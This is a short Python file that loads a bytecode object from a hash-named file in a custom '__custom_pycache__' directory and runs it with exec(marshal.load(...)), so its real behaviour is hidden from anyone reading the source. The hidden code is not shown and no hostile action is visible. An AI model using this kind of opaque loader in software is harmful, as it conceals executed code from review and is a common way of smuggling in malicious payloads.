
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'utls_2d3d2de007c042c4afbe876b29c1147f.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
